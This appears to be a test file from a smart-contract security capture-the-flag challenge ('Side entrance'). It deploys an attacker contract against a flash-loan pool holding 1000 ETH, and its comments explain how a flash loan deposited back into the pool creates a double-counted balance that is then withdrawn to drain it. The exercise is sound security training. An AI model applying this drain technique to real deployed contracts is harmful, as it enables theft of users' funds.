const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
const SideEntranceLenderPoolAttacker = contract.fromArtifact('SideEntranceLenderPoolAttacker');

const { expect } = require('chai');

describe('[Challenge] Side entrance', function() {
	const [ deployer, attacker, ...otherAccounts ] = accounts;

	const ETHER_IN_POOL = ether('1000');

	before(async function() {
		/** SETUP SCENARIO */
		this.pool = await SideEntranceLenderPool.new({ from: deployer });
		//deposit 1000 in pool.
		await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });
		// get attacker balance.
		this.attackerInitialEthBalance = await balance.current(attacker);
		//contracl ETH same as initial constant 1000.
		expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL);
	});

	it('Exploit', async function() {
		/** YOUR EXPLOIT GOES HERE */
		//deploy attacker contract
		const vector = await SideEntranceLenderPoolAttacker.new({ from: attacker });
		// Call attack.
		//flashLoan(address(pool).balance);
		// Use execute in attacker contract. call deposit{ value: msg.value }(); cause balance to ++
		// address(this).balance >= balanceBefore remains true.
		//2nd function of attack .withdraw(); all ETH.from pool.
		//calls the fallback-function with all the ETH
		//msg.sender.call{ value: address(this).balance } (''); withdraw all eth from attack contract.
		await vector.attack(this.pool.address, { from: attacker });
		//Trick here is to use a smart contract to send back the original ETH and call deposit. creating double entry of balances.
	});

	after(async function() {
		/** SUCCESS CONDITIONS */
		expect(await balance.current(this.pool.address)).to.be.bignumber.equal('0');

		// Not checking exactly how much is the final balance of the attacker,
		// because it'll depend on how much gas the attacker spends in the attack
		// If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
		expect(await balance.current(attacker)).to.be.bignumber.gt(this.attackerInitialEthBalance);
	});
});
